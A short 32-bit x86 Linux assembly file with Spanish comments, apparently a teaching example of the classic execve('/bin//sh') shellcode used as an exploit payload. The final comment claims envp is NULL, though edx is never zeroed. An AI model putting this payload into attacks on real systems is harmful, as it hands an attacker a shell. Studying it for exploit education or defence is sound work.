section .text
global _start
_start:
xor eax, eax		;eax = 0
push eax		;"\0" valor nulo para terminar la cadena
push dword 0x68732f2f	;"//sh"
push dword 0x6e69622f	;"/bin"
mov ebx, esp		;ebx contiene la dirección actual de esp que apunta a "/bin//sh\0"
push eax		;NULL -> args[1]
push ebx		;"/bin//sh\0" -> args[0]
mov ecx, esp		;ecx contiene la dirección actual de esp que apunta a su vez al contenido previo de ebx
mov al, 0x0b		;Llamada al sistema sys_execve
int 0x80		;execve("/bin/sh", args["/bin/sh", "NULL"], NULL)
